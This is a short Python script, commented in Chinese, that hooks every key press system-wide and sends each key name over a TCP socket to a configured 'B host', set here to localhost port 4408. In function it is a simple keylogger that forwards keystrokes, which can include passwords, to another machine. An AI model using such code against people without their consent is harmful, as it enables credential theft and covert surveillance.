import socket
import keyboard

# 设置与B主机通信的IP地址和端口号
B_HOST = '127.0.0.1'
B_PORT = 4408

# 创建TCP socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((B_HOST, B_PORT))

def on_key_event(event):
    # 处理按键事件
    key = event.name
    
    if event.event_type == keyboard.KEY_DOWN:
        print(key)
        # 发送按键名称到B主机
        client_socket.sendall(key.encode())

# 监听键盘事件

keyboard.on_press(on_key_event)
keyboard.wait()
